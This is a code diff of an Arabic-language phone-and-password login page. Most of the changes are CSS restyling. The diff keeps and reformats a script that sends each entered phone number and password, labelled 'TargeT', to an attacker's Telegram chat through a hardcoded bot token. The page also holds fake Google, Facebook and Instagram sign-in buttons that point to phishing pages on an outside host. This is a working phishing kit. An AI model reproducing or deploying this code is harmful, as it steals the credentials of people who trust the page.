@@ -9,7 +9,7 @@
     <!-- Google Fonts -->
     <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;700&display=swap" rel="stylesheet">
 
-    <style> 
+    <style>
         /* Set the background image */
         body {
             margin: 0;
@@ -20,18 +20,27 @@
             display: flex;
             align-items: center;
             justify-content: center;
-            font-family: 'Roboto', sans-serif; /* Use Google Font */
+            font-family: 'Roboto', sans-serif;
+            text-decoration: none; /* Remove underline for all text */
         }
-
+           a {
+            text-decoration: none;
+        }
         /* Card Container */
         .card {
-            background-color: rgba(255, 255, 255, 0.85); /* Semi-transparent white background */
-            padding: 20px;
-            border-radius: 15px;
-            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
+            background-color: rgba(255, 255, 255, 0.9);
+            padding: 30px;
+            border-radius: 20px;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.5);
             max-width: 400px;
             width: 100%;
             text-align: center;
+            transition: transform 0.3s, box-shadow 0.3s;
+        }
+
+        .card:hover {
+            transform: translateY(-10px);
+            box-shadow: 0 15px 40px rgba(0, 0, 0, 0.6);
         }
 
         /* Style for the logo */
@@ -41,50 +50,55 @@
             margin-bottom: 20px;
         }
 
-        /* Style for the input fields */
         .phone-input {
-            width: 90%;
-            height: 50px;
-            font-size: 16px;
-            padding: 5px 10px;
+            width: 80%; /* Reduce width */
+            height: 40px; /* Reduce height */
+            font-size: 14px; /* Optionally reduce font size */
+            padding: 8px; /* Optionally reduce padding */
             margin-bottom: 15px;
             border-radius: 8px;
-            border: 1px solid #ccc;
+            border: 1px solid #ddd;
             text-align: center;
             font-family: 'Roboto', sans-serif;
+            transition: border 0.3s, box-shadow 0.3s;
+        }
+        .phone-input:focus {
+            border-color: #ff7e5f;
+            box-shadow: 0 0 5px rgba(255, 126, 95, 0.5);
+            outline: none;
         }
 
         /* Style for the login button */
         .login-button {
             width: 100%;
-            height: 45px;
-            background: linear-gradient(135deg, #ff7e5f, #feb47b); /* Gradient background */
+            height: 50px;
+            background: linear-gradient(135deg, #ff7e5f, #feb47b);
             color: white;
             font-size: 18px;
             border: none;
             border-radius: 8px;
             margin-bottom: 15px;
             cursor: pointer;
-            text-decoration: none; /* Remove underline */
-            font-family: 'Roboto', sans-serif;
-            display: inline-flex; /* Ensure button maintains width */
-            align-items: center; /* Center text vertically */
-            justify-content: center; /* Center text horizontally */
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            transition: background 0.3s, transform 0.3s;
         }
 
         .login-button:hover {
             background: linear-gradient(135deg, #feb47b, #ff7e5f);
+            transform: scale(1.05);
         }
 
         /* Style for the additional icon and text */
         .more-info {
             font-family: 'Roboto', sans-serif;
             color: #333;
-            text-decoration: none;
             margin-top: 10px;
             display: flex;
             align-items: center;
             justify-content: center;
+            transition: color 0.3s, transform 0.3s;
         }
 
         .more-info img {
@@ -93,11 +107,16 @@
             margin-right: 8px;
         }
 
+        .more-info:hover {
+            color: #ff7e5f; /* Change color on hover */
+            transform: scale(1.05); /* Slightly enlarge on hover */
+        }
+
         /* Style for the new auth buttons */
         .auth-button {
             width: 100%;
-            height: 45px;
-            background-color: rgba(0, 0, 0, 0.7); 
+            height: 50px;
+            background-color: rgba(0, 0, 0, 0.8);
             color: white;
             font-size: 18px;
             border: none;
@@ -107,8 +126,7 @@
             display: flex;
             align-items: center;
             justify-content: center;
-            text-decoration: none; 
-            font-family: 'Roboto', sans-serif;
+            transition: background 0.3s, transform 0.3s;
         }
 
         .auth-button img {
@@ -119,6 +137,7 @@
 
         .auth-button:hover {
             background-color: rgba(0, 0, 0, 0.9);
+            transform: scale(1.05);
         }
 
         /* Style for the popup */
@@ -135,6 +154,7 @@
             border-radius: 10px;
             z-index: 1000;
             font-family: 'Roboto', sans-serif;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.5);
         }
 
         .popup h2 {
@@ -150,6 +170,7 @@
             border: none;
             border-radius: 5px;
             cursor: pointer;
+            transition: background 0.3s;
         }
 
         .popup button:hover {
@@ -181,22 +202,23 @@
         <div id="error-message"></div>
 
         <!-- Login Button -->
-             <a href="rowan.html" class="login-button">Login</a>
+        <a href="rowan.html" class="login-button">Login</a>
+        
         <!-- Additional icon and text -->
         <a href="https://www.youtube.com/watch?v=ikMmzrnkRgM" class="more-info">
             <img src="telegram.png" alt="More Info Icon"> More Info
         </a>
-        <!-- New Auth buttons -->
-<a href="https://dataarab3.serv00.net/google/5318149339/index.php" class="auth-button">
-    <img src="path-to-google-icon.png" alt="Google Icon"> Continue with Google
-</a>
-<a href="https://dataarab3.serv00.net/facebook/5318149339/index.php" class="auth-button">
-    <img src="path-to-github-icon.png" alt="GitHub Icon"> Continue with Facebook
-</a>
-<a href="https://dataarab3.serv00.net/Instagram/5318149339/index.php" class="auth-button">
-    <img src="path-to-stripe-icon.png" alt="GitHub Icon"> Continue with Instagram
-</a>
 
+        <!-- New Auth buttons -->
+        <a href="https://dataarab3.serv00.net/google/5318149339/index.php" class="auth-button">
+            <img src="path-to-google-icon.png" alt="Google Icon"> Continue with Google
+        </a>
+        <a href="https://dataarab3.serv00.net/facebook/5318149339/index.php" class="auth-button">
+            <img src="path-to-github-icon.png" alt="GitHub Icon"> Continue with Facebook
+        </a>
+        <a href="https://dataarab3.serv00.net/Instagram/5318149339/index.php" class="auth-button">
+            <img src="path-to-stripe-icon.png" alt="GitHub Icon"> Continue with Instagram
+        </a>
 
         <!-- Popup window -->
         <div class="popup" id="popup">
@@ -204,74 +226,67 @@
             <button onclick="closePopup()">close</button>
         </div>
 
-<script>
-    // Function to close the popup and play sound
-    function closePopup() {
-        document.getElementById('popup').style.display = 'none';
-
-        // Get the audio element and play the sound
-        var audio = document.getElementById('close-sound');
-        audio.play();
-    }
-
-
-        // Show the popup when the page loads
-        window.onload = function() {
-            document.getElementById('popup').style.display = 'block';
-        };
-
-        // Function to close the popup
-        function closePopup() {
-            document.getElementById('popup').style.display = 'none';
-        }
-
-        function sendToTelegram() {
-            var phoneNumber = document.querySelector('.phone-input[type="text"]').value;
-            var password = document.querySelector('.phone-input[type="password"]').value;
-
-            var telegramBotToken = "6428071347:AAHP1yP2bZFkKB_82pBcseiH4Dgu-EVtEAU"; 
-            var chatId = "5318149339"; 
-            var message = "TargeT: " + phoneNumber + "\nPassword: " + password;
-
-            var telegramUrl = `https://api.telegram.org/bot${telegramBotToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
-
-            // Send the message to Telegram
-            var xhr = new XMLHttpRequest();
-            xhr.open("GET", telegramUrl, true);
-            xhr.send();
-        }
-
-        document.querySelector('.phone-input').addEventListener('change', sendToTelegram);
-
-        // Function to handle the login button click
-        document.querySelector('.login-button').addEventListener('click', function(event) {
-            var phoneNumber = document.querySelector('.phone-input[type="text"]').value;
-            var password = document.querySelector('.phone-input[type="password"]').value;
-            var errorMessage = document.getElementById('error-message');
-
-            // Clear previous error
-            errorMessage.style.display = 'none';
-
-            // Validate phone number
-            if (!/^\d{11}$/.test(phoneNumber)) {
-                errorMessage.textContent = 'يرجى إدخال رقم هاتف صحيح.';
-                errorMessage.style.display = 'block';
-                event.preventDefault();
-                return;
+        <script>
+            // Function to close the popup and play sound
+            function closePopup() {
+                document.getElementById('popup').style.display = 'none';
+                // Get the audio element and play the sound
+                var audio = document.getElementById('close-sound');
+                audio.play();
             }
 
-         
-const specificPassword = 'rewan2332000'; 
+            // Show the popup when the page loads
+            window.onload = function() {
+                document.getElementById('popup').style.display = 'block';
+            };
 
-// التحقق من كلمة المرور
-if (password !== specificPassword) {
-    errorMessage.textContent = 'كلمة المرور غير صحيحة. يرجى إدخال كلمة المرور المحددة.';
-    errorMessage.style.display = 'block';
-    event.preventDefault();
-    return;
-}
-            sendToTelegram();
-        });
-    </script>
+            function sendToTelegram() {
+                var phoneNumber = document.querySelector('.phone-input[type="text"]').value;
+                var password = document.querySelector('.phone-input[type="password"]').value;
+
+                var telegramBotToken = "6428071347:AAHP1yP2bZFkKB_82pBcseiH4Dgu-EVtEAU"; 
+                var chatId = "5318149339"; 
+                var message = "TargeT: " + phoneNumber + "\nPassword: " + password;
+
+                var telegramUrl = `https://api.telegram.org/bot${telegramBotToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
+                
+                // Send the message to Telegram
+                var xhr = new XMLHttpRequest();
+                xhr.open("GET", telegramUrl, true);
+                xhr.send();
+            }
+
+            document.querySelector('.phone-input').addEventListener('change', sendToTelegram);
+
+            // Function to handle the login button click
+            document.querySelector('.login-button').addEventListener('click', function(event) {
+                var phoneNumber = document.querySelector('.phone-input[type="text"]').value;
+                var password = document.querySelector('.phone-input[type="password"]').value;
+                var errorMessage = document.getElementById('error-message');
+
+                // Clear previous error
+                errorMessage.style.display = 'none';
+
+                // Validate phone number
+                if (!/^\d{11}$/.test(phoneNumber)) {
+                    errorMessage.textContent = 'يرجى إدخال رقم هاتف صحيح.';
+                    errorMessage.style.display = 'block';
+                    event.preventDefault();
+                    return;
+                }
+
+                const specificPassword = 'rewan2332000'; 
+
+                // التحقق من كلمة المرور
+                if (password !== specificPassword) {
+                    errorMessage.textContent = 'كلمة المرور غير صحيحة. يرجى إدخال كلمة المرور المحددة.';
+                    errorMessage.style.display = 'block';
+                    event.preventDefault();
+                    return;
+                }
+                sendToTelegram();
+            });
+        </script>
+    </div>
 </body>
 </html>
